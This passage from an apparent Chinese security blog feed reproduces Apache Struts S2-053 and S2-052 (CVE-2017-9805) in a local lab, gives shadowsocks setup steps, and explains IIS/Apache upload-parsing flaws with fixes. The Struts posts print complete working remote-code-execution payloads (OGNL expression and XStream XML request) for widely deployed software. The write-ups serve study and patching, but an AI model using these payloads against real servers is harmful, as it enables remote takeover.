<h2 id="s2-053-POC"><a href="#s2-053-POC" class="headerlink" title="s2-053 POC"></a>s2-053 POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;whoami&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</div></pre></td></tr></table></figure>
<p>注意：执行命令的地方在于(#cmd=’whoami’)</p>
<h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><p>可以使用war包或docker复现</p>
<h3 id="使用war包搭建环境"><a href="#使用war包搭建环境" class="headerlink" title="使用war包搭建环境"></a>使用war包搭建环境</h3><p>下载war包 链接：<a href="http://pan.baidu.com/s/1qXW3FPi" target="_blank" rel="external">http://pan.baidu.com/s/1qXW3FPi</a> 密码：9exb<br>下载后把它放到tomcat目录下的webapps目录下，重启tomcat后访问：<a href="http://127.0.0.1:8080/s2-053" target="_blank" rel="external">http://127.0.0.1:8080/s2-053</a><br><img src="/upload_img/s2_053_1.png" alt=""></p>
<h3 id="使用docker搭建环境"><a href="#使用docker搭建环境" class="headerlink" title="使用docker搭建环境"></a>使用docker搭建环境</h3><p>快速搭建各种漏洞环境(Various vulnerability environment) <a href="https://github.com/Medicean/VulApps" target="_blank" rel="external">https://github.com/Medicean/VulApps</a><br>搭建好后访问 <a href="http://127.0.0.1:8080/hello.action" target="_blank" rel="external">http://127.0.0.1:8080/hello.action</a><br><img src="/upload_img/s2_053_2.png" alt=""></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>打开页面，输入表达式%{33-1}进行测试，发现成功执行，返回32<br><img src="/upload_img/s2_053_3.png" alt=""><br>说明漏洞存在</p>
<h3 id="执行POC"><a href="#执行POC" class="headerlink" title="执行POC"></a>执行POC</h3><p>输入POC提交<br><img src="/upload_img/s2_053_4.png" alt=""></p>
<h3 id="来个调用计算器（calc）"><a href="#来个调用计算器（calc）" class="headerlink" title="来个调用计算器（calc）"></a>来个调用计算器（calc）</h3><p>把(#cmd=’whoami’)里面的whoami缓存calc<br><img src="/upload_img/s2_053_5.png" alt=""></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>当在Freemarker标签中使用表达式文本或强制表达式时，使用以下请求值可能会导致远程代码执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;@s.hidden </div><div class="line">name=&quot;strutsS&quot; value=strutsS/&gt; </div><div class="line">&lt;@s.hidden name=&quot;strutsS&quot; </div><div class="line">value=&quot;$&#123;strutsS&#125;&quot; /&gt;</div></pre></td></tr></table></figure></p>
<p>这两种情况下，值属性都使用可写属性，都会受到Freemarker表达式影响</p>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.升级到Apache Struts 2.5.13或2.3.34<br>2.Freemarker标签内容不要通过Request方式获取<br>3.使用只读属性来初始化value属性（仅限getter属性）<br>4.不要使用如下结构<br>&lt;@s.hidden name=”redirectUri” value=redirectUri /&gt;<br>&lt;@s.hidden name=”redirectUri” value=”${redirectUri}” /&gt;</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2017年9月7日，Struts官方发布一个中危的安全漏洞，该漏洞编号为:S2-053,在一定条件下，当开发人员在Freemarker标签中使用错误的构造时，可能会导致远程代码执行漏洞&lt;br&gt;
    
    </summary>
    
      <category term="漏洞复现" scheme="http://y-hkl.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞" scheme="http://y-hkl.top/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="s2-053" scheme="http://y-hkl.top/tags/s2-053/"/>
    
  </entry>
  
  <entry>
    <title>s2-052复现</title>
    <link href="http://y-hkl.top/2017/09/08/s2-052%E5%A4%8D%E7%8E%B0/"/>
    <id>http://y-hkl.top/2017/09/08/s2-052复现/</id>
    <published>2017-09-08T07:35:17.000Z</published>
    <updated>2017-09-08T08:43:32.134Z</updated>
    
    <content type="html"><![CDATA[<p>struts2这两天又出新漏洞了，漏洞为s2-052，这里是对漏洞的复现。只用于个人研究</p>
<h2 id="s2-052漏洞介绍"><a href="#s2-052漏洞介绍" class="headerlink" title="s2-052漏洞介绍"></a>s2-052漏洞介绍</h2><p>问题出现在struts2-rest-plugin插件XStreamHandler处理器中的toObject()方法，其中未对传入的值进行任何限制，在使用XStream反<br>漏洞编号：CVE-2017-9805(S2-052)<br>影响版本：Struts 2.5 - Struts 2.5.12<br><a id="more"></a></p>
<h2 id="s2-052-POC"><a href="#s2-052-POC" class="headerlink" title="s2-052 POC"></a>s2-052 POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">POST /struts2-rest-showcase/orders/3;jsessionid=A82EAA2857A1FFAF61FF24A1FBB4A3C7 HTTP/1.1</div><div class="line">Host: 127.0.0.1:8080</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Content-Type: application/xml</div><div class="line">Content-Length: 2365</div><div class="line">Referer: http://127.0.0.1:8080/struts2-rest-showcase/orders/3/edit</div><div class="line">Cookie: JSESSIONID=A82EAA2857A1FFAF61FF24A1FBB4A3C7</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line"></div><div class="line">&lt;map&gt;</div><div class="line">  &lt;entry&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</div><div class="line">      &lt;flags&gt;0&lt;/flags&gt;</div><div class="line">      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</div><div class="line">        &lt;dataHandler&gt;</div><div class="line">          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</div><div class="line">            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</div><div class="line">              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</div><div class="line">                &lt;initialized&gt;false&lt;/initialized&gt;</div><div class="line">                &lt;opmode&gt;0&lt;/opmode&gt;</div><div class="line">                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</div><div class="line">                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</div><div class="line">                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</div><div class="line">                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</div><div class="line">                      &lt;command&gt;</div><div class="line">                        &lt;string&gt;calc&lt;/string&gt;</div><div class="line">                      &lt;/command&gt;</div><div class="line">                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</div><div class="line">                    &lt;/next&gt;</div><div class="line">                  &lt;/iter&gt;</div><div class="line">                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</div><div class="line">                    &lt;method&gt;</div><div class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</div><div class="line">                      &lt;name&gt;start&lt;/name&gt;</div><div class="line">                      &lt;parameter-types/&gt;</div><div class="line">                    &lt;/method&gt;</div><div class="line">                    &lt;name&gt;foo&lt;/name&gt;</div><div class="line">                  &lt;/filter&gt;</div><div class="line">                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</div><div class="line">                &lt;/serviceIterator&gt;</div><div class="line">                &lt;lock/&gt;</div><div class="line">              &lt;/cipher&gt;</div><div class="line">              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</div><div class="line">              &lt;ibuffer&gt;&lt;/ibuffer&gt;</div><div class="line">              &lt;done&gt;false&lt;/done&gt;</div><div class="line">              &lt;ostart&gt;0&lt;/ostart&gt;</div><div class="line">              &lt;ofinish&gt;0&lt;/ofinish&gt;</div><div class="line">              &lt;closed&gt;false&lt;/closed&gt;</div><div class="line">            &lt;/is&gt;</div><div class="line">            &lt;consumed&gt;false&lt;/consumed&gt;</div><div class="line">          &lt;/dataSource&gt;</div><div class="line">          &lt;transferFlavors/&gt;</div><div class="line">        &lt;/dataHandler&gt;</div><div class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</div><div class="line">      &lt;/value&gt;</div><div class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</div><div class="line">  &lt;/entry&gt;</div><div class="line">  &lt;entry&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</div><div class="line">  &lt;/entry&gt;</div><div class="line">&lt;/map&gt;</div></pre></td></tr></table></figure>
<p>注意：执行命令的地方在于command内,这里我是在windows上执行的，在其他系统中执行写出相对应的就可以了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;command&gt;</div><div class="line">&lt;string&gt;</div><div class="line">calc</div><div class="line">&lt;/string&gt;</div><div class="line">&lt;/command&gt;</div></pre></td></tr></table></figure></p>
<h2 id="s2-052漏洞复现"><a href="#s2-052漏洞复现" class="headerlink" title="s2-052漏洞复现"></a>s2-052漏洞复现</h2><h3 id="安装Java"><a href="#安装Java" class="headerlink" title="安装Java"></a>安装Java</h3><h4 id="下载JDK"><a href="#下载JDK" class="headerlink" title="下载JDK"></a>下载JDK</h4><p>在官网上下载JDK <a href="http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="external">http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html</a><br>我是在windows上搭建的所以，下载windows版本的</p>
<h4 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h4><p>1 新建系统变量：<br>变量名:JAVA_HOME<br>变量值:你的JDK安装目录<br>2 再新建系统变量：<br>变量名:CLASSPATH<br>值:.;%JAVA_HOME%\lib;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;%TOMCAT_HOME%\BIN<br>注意：前面的点号<br>3 修改PATH变量<br>变量名：PATH<br>值：;%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin;<br>注意：前面的分号，将此值添加到，path变量值的最后面</p>
<h3 id="安装Tomcat"><a href="#安装Tomcat" class="headerlink" title="安装Tomcat"></a>安装Tomcat</h3><h4 id="下载Tomcat"><a href="#下载Tomcat" class="headerlink" title="下载Tomcat"></a>下载Tomcat</h4><p>在官网上下载Tomcat <a href="http://tomcat.apache.org/download-90.cgi" target="_blank" rel="external">http://tomcat.apache.org/download-90.cgi</a><br>下载你需要的版本<br>下载完成以后解压到你想解压的目录就可以了</p>
<h4 id="配置Tomcat的环境变量"><a href="#配置Tomcat的环境变量" class="headerlink" title="配置Tomcat的环境变量"></a>配置Tomcat的环境变量</h4><p>新建Tomcat环境变量<br>变量名:TOMCAT_HOME<br>变量值:你的TOMCAT所在目录</p>
<h4 id="启动Tomcat"><a href="#启动Tomcat" class="headerlink" title="启动Tomcat"></a>启动Tomcat</h4><p>打开bin文件夹—双击startup.bat;系统会打开一个dos窗口，即启动成功；<br>如果未打开dos窗口或者dos窗口一闪而过，可能是jdk的配置出错，请安装上面的进行注意检查</p>
<p>访问：<a href="http://127.0.0.1:8080" target="_blank" rel="external">http://127.0.0.1:8080</a><br>注意：若要修改tomcat端口，可打开/Library/Tomcat/conf/server.xml文件，修改8080端口。</p>
<h3 id="下载受影响的struts2版本"><a href="#下载受影响的struts2版本" class="headerlink" title="下载受影响的struts2版本"></a>下载受影响的struts2版本</h3><p>1.从struts2的官网下载最后受影响的版本struts-2.5.12，地址： <a href="http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip" target="_blank" rel="external">http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip</a> 注意下载struts-2.5.12-apps即可，不需要下载struts-2.5.12-all.zip。不然struts-2.5.12-all.zip中包含很多其他的东西，可以看到lib目录下有很多jar包。<br>2.拿到struts-2.5.12-apps之后，将其中的app目录下的struts2-rest-showcase.war文件放到webapps目录下，然后设置一下conf/server.xml文件即可。<br>3.这里把appBase设置为webapps目录，然后unpackWARs设置为true，这样就会自动解包xxx.war，autoDeploy也设置为true(热部署?) 然后就可以浏览器访问了。 直接输入 <a href="http://127.0.0.1:8080/struts2-rest-showcase/" target="_blank" rel="external">http://127.0.0.1:8080/struts2-rest-showcase/</a> 会跳转，然后出现下面的页面<br><img src="/upload_img/s2_052_1.png" alt=""></p>
<h3 id="开始复现"><a href="#开始复现" class="headerlink" title="开始复现"></a>开始复现</h3><p>进入编辑页面<br><img src="/upload_img/s2_052_2.png" alt=""><br>设置抓包，点击提交按钮<br><img src="/upload_img/s2_052_3.png" alt=""><br><img src="/upload_img/s2_052_4.png" alt=""><br>修改Content-Type和POST提交的数据<br><img src="/upload_img/s2_052_5.png" alt=""><br>可以看到计算器已经调用出来<br><img src="/upload_img/s2_052_6.png" alt=""></p>
<h2 id="修补方法"><a href="#修补方法" class="headerlink" title="修补方法"></a>修补方法</h2><p>1.升级Struts到2.5.13最新版本。<br>2.在不使用时删除Struts REST插件，或仅限于服务器普通页面和JSONs</p>
<h2 id="python验证脚本"><a href="#python验证脚本" class="headerlink" title="python验证脚本"></a>python验证脚本</h2><p><a href="https://github.com/ysrc/xunfeng/commit/f9ae69fe176c8bca622831e126cd94414ebe26f6?from=timeline&amp;isappinstalled=0" target="_blank" rel="external">https://github.com/ysrc/xunfeng/commit/f9ae69fe176c8bca622831e126cd94414ebe26f6?from=timeline&amp;isappinstalled=0</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;struts2这两天又出新漏洞了，漏洞为s2-052，这里是对漏洞的复现。只用于个人研究&lt;/p&gt;
&lt;h2 id=&quot;s2-052漏洞介绍&quot;&gt;&lt;a href=&quot;#s2-052漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;s2-052漏洞介绍&quot;&gt;&lt;/a&gt;s2-052漏洞介绍&lt;/h2&gt;&lt;p&gt;问题出现在struts2-rest-plugin插件XStreamHandler处理器中的toObject()方法，其中未对传入的值进行任何限制，在使用XStream反&lt;br&gt;漏洞编号：CVE-2017-9805(S2-052)&lt;br&gt;影响版本：Struts 2.5 - Struts 2.5.12&lt;br&gt;
    
    </summary>
    
      <category term="漏洞复现" scheme="http://y-hkl.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="s2-052" scheme="http://y-hkl.top/tags/s2-052/"/>
    
      <category term="漏洞" scheme="http://y-hkl.top/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>搭建shadowsocks服务</title>
    <link href="http://y-hkl.top/2017/09/02/%E6%90%AD%E5%BB%BAshadowsocks%E6%9C%8D%E5%8A%A1/"/>
    <id>http://y-hkl.top/2017/09/02/搭建shadowsocks服务/</id>
    <published>2017-09-02T06:15:21.000Z</published>
    <updated>2017-09-02T06:55:55.285Z</updated>
    
    <content type="html"><![CDATA[<p>搭建ss服务器可以登录外网查询资料，访问谷歌，方便自己的使用。在服务器上搭建shadowsocks服务端，本地服务器上搭建客户端用来连接使用。<br><a id="more"></a></p>
<h2 id="安装前的准备"><a href="#安装前的准备" class="headerlink" title="安装前的准备"></a>安装前的准备</h2><h3 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h3><p>从pip官网 <a href="https://pypi.python.org/pypi/pip" target="_blank" rel="external">https://pypi.python.org/pypi/pip</a> 下载pip的源代码</p>
<p>#解压<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar -zxvf pip-1.5.5.tar.gz</div></pre></td></tr></table></figure></p>
<p>这个时候会报错说少了setuptools<br>从setuptools官网 <a href="https://pypi.python.org/pypi/setuptools" target="_blank" rel="external">https://pypi.python.org/pypi/setuptools</a> 下载setuptools原来</p>
<p>#解压<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">tar -zxvf setuptools-3.6.tar.gz </div><div class="line">cd setuptools-3.6</div></pre></td></tr></table></figure></p>
<p>#安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python setup.py install</div></pre></td></tr></table></figure></p>
<p>再次安装pip就OK了</p>
<h3 id="安装M2Crypto"><a href="#安装M2Crypto" class="headerlink" title="安装M2Crypto"></a>安装M2Crypto</h3><p>先安装依赖包：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install -y openssl-devel gcc swig python-devel autoconf libtool</div></pre></td></tr></table></figure></p>
<p>再通过pip安装M2Crypto：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install M2Crypto</div></pre></td></tr></table></figure></p>
<h2 id="安装shadowsocks"><a href="#安装shadowsocks" class="headerlink" title="安装shadowsocks"></a>安装shadowsocks</h2><p>使用pip安装shadowsocks<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install shadowsocks</div></pre></td></tr></table></figure></p>
<h2 id="配置config文件"><a href="#配置config文件" class="headerlink" title="配置config文件"></a>配置config文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/shadowsocks.json</div></pre></td></tr></table></figure>
<p>单用户配置:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">&quot;server&quot;:&quot;&quot;,     ##服务器ip地址</div><div class="line">&quot;server_port&quot;:8000,  ##代理端口</div><div class="line">&quot;local_address&quot;:&quot;127.0.0.1&quot;,</div><div class="line">&quot;local_port&quot;:1080, ##本地监听端口</div><div class="line">&quot;password&quot;:&quot;&quot;,   ##连接密码</div><div class="line">&quot;timeout&quot;:300,</div><div class="line">&quot;method&quot;:&quot;aes-256-cfb&quot;, ##加密方式</div><div class="line">&quot;dast_open&quot;:false</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>多用户配置:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">&quot;server&quot;:&quot;&quot;,</div><div class="line">&quot;local_address&quot;:&quot;127.0.0.1&quot;,</div><div class="line">&quot;local_port&quot;:1080,</div><div class="line">&quot;port_password&quot;:&#123;</div><div class="line">&quot;8000&quot;:&quot;123456&quot;,</div><div class="line">&quot;8001&quot;:&quot;123456&quot;</div><div class="line">&#125;,</div><div class="line">&quot;timeout&quot;:300,</div><div class="line">&quot;method&quot;:&quot;aes-256-cfb&quot;,</div><div class="line">&quot;fast_open&quot;:false</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="命令行启动关闭"><a href="#命令行启动关闭" class="headerlink" title="命令行启动关闭"></a>命令行启动关闭</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ssserver -c /etc/shadowsocks/config.json -d start 后台启动</div><div class="line">ssserver -c /etc/shadowsocks/config.json -d stop 后台停止</div></pre></td></tr></table></figure>
<h2 id="设置开机启动"><a href="#设置开机启动" class="headerlink" title="设置开机启动"></a>设置开机启动</h2><p>将启动的命令加入到/etc/rc.local文件的最后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vi /etc/rc.local</div></pre></td></tr></table></figure></p>
<h2 id="设置非root用户运行ss"><a href="#设置非root用户运行ss" class="headerlink" title="设置非root用户运行ss"></a>设置非root用户运行ss</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">useradd ssuser //添加一个ssuser用户</div><div class="line">ssserver [other options] --user ssuser //用ssuser这个用户来运行ss</div></pre></td></tr></table></figure>
<p>将之前的ssserver -c /etc/shadowsocks.json -d start改为ssserver -c /etc/shadowsocks.json -d start –user ssuser</p>
<h2 id="防火墙设置（如有）"><a href="#防火墙设置（如有）" class="headerlink" title="防火墙设置（如有）"></a>防火墙设置（如有）</h2><p>编辑防火墙配置文件/etc/sysconfig/iptables，将服务器端口（server_port）放行。新增一条防火墙规则：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-A INPUT -m state --state NEW -m tcp -p tcp --dport 8989 -j ACCEPT</div></pre></td></tr></table></figure></p>
<p>重启防火墙iptables：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service iptables restart</div></pre></td></tr></table></figure></p>
<h2 id="安装客户端"><a href="#安装客户端" class="headerlink" title="安装客户端"></a>安装客户端</h2><p>windows安装shadowsocks客户端比较简单，直接下载安装程序。<br>启动以后，填入服务端相应的配置（ip，port，密码，加密方式）<br>设置模式：<br><img src="/upload_img/shadowsocks_1.png" alt=""><br><img src="/upload_img/shadowsocks_2.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;搭建ss服务器可以登录外网查询资料，访问谷歌，方便自己的使用。在服务器上搭建shadowsocks服务端，本地服务器上搭建客户端用来连接使用。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://y-hkl.top/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="shadowsocks" scheme="http://y-hkl.top/tags/shadowsocks/"/>
    
  </entry>
  
  <entry>
    <title>服务器解析漏洞</title>
    <link href="http://y-hkl.top/2017/09/01/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
    <id>http://y-hkl.top/2017/09/01/服务器解析漏洞/</id>
    <published>2017-09-02T01:49:39.000Z</published>
    <updated>2017-09-02T02:04:13.270Z</updated>
    
    <content type="html"><![CDATA[<p>服务器解析漏洞已经是一个老生常谈问题了，但是有些服务器依然存在，这里复习记录一下常见服务器解析漏洞，比如IIS6.0，IIS7.5，acache，nginx解析漏洞。<br><a id="more"></a></p>
<h2 id="一-IIS5-x-6-x解析漏洞"><a href="#一-IIS5-x-6-x解析漏洞" class="headerlink" title="一.IIS5.x-6.x解析漏洞"></a>一.IIS5.x-6.x解析漏洞</h2><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件</p>
<h3 id="目录解析-6-0"><a href="#目录解析-6-0" class="headerlink" title="目录解析(6.0)"></a>目录解析(6.0)</h3><p>形式：www.xxx.com/xx.asp/xx.jpg<br>原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。</p>
<h3 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h3><p>形式：www.xxx.com/xx.asp;.jpg<br>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。</p>
<h3 id="解析文件类型"><a href="#解析文件类型" class="headerlink" title="解析文件类型"></a>解析文件类型</h3><p>IIS6.0 默认的可执行文件除了asp还包含这三种 :<br>/test.asa<br>/test.cer<br>/test.cdx</p>
<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>1.禁止用户控制文件上传目录，新建目录等权限<br>2.上传目录与用户新建的目录禁止执行<br>3.上传的文件重命名，不保留用户上传文件的后缀<br>4.禁止asa、asp、cer、cdx等后缀的文件上传</p>
<h2 id="二-apache解析漏洞"><a href="#二-apache解析漏洞" class="headerlink" title="二.apache解析漏洞"></a>二.apache解析漏洞</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理　"></a>漏洞原理　</h3><p>Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</p>
<h3 id="漏洞形式"><a href="#漏洞形式" class="headerlink" title="漏洞形式"></a>漏洞形式</h3><p>www.xxxx.xxx.com/test.php.php123</p>
<h3 id="其余配置问题导致漏洞"><a href="#其余配置问题导致漏洞" class="headerlink" title="其余配置问题导致漏洞"></a>其余配置问题导致漏洞</h3><p>（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行</p>
<h3 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h3><p>1.apache配置文件，禁止.php.这样的文件执行，配置文件里面加入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;Files ~ “.(php.|php3.)”&gt;</div><div class="line">Order Allow,Deny</div><div class="line">Deny from all</div><div class="line">&lt;/Files&gt;</div></pre></td></tr></table></figure></p>
<p>2.用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so<br>把#号去掉，重启apache,在网站根目录下建立.htaccess文件,代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;IfModule mod_rewrite.c&gt;</div><div class="line">RewriteEngine On</div><div class="line">RewriteRule .(php.|php3.) /index.php</div><div class="line">RewriteRule .(pHp.|pHp3.) /index.php</div><div class="line">RewriteRule .(phP.|phP3.) /index.php</div><div class="line">RewriteRule .(Php.|Php3.) /index.php</div><div class="line">RewriteRule .(PHp.|PHp3.) /index.php</div><div class="line">RewriteRule .(PhP.|PhP3.) /index.php</div><div class="line">RewriteRule .(pHP.|pHP3.) /index.php</div><div class="line">RewriteRule .(PHP.|PHP3.) /index.php</div><div class="line">&lt;/IfModule&gt;</div></pre></td></tr></table></figure></p>
